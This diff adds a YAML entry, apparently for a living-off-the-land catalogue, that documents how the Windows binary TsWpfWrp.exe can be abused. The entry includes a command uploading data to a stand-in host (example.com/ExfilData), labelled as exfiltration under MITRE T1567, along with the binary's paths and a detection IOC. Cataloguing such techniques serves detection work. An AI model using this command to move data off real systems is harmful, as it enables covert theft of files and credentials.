@@ -1,0 +1,24 @@
+---
+Name: TsWpfWrp.exe
+Description: Windows Presentation Foundation Terminal Server Print Wrapper
+Author: Avihay Eldad
+Created: 2024-04-25
+Commands:
+  - Command: TsWpfWrp.exe http://example.com/ExfilData blabla
+    Description: Upload file, credentials or data exfiltration in general
+    Usecase: Exfilitrate data to remote server
+    Category: Upload
+    Privileges: User
+    MitreID: T1567
+    OperatingSystem: Windows
+Full_Path:
+  - Path: C:\Windows\System32\TsWpfWrp.exe
+  - Path: C:\Windows\SysWOW64\TsWpfWrp.exe
+Detection:
+  - IOC: TsWpfWrp making unexpected network connections or DNS requests
+Acknowledgement:
+  - Person: Avihay Eldad
+    Handle: '@AvihayEldad'
+  - Person: Sagi Dinar
+    Handle: '@DinarSagi'
+    
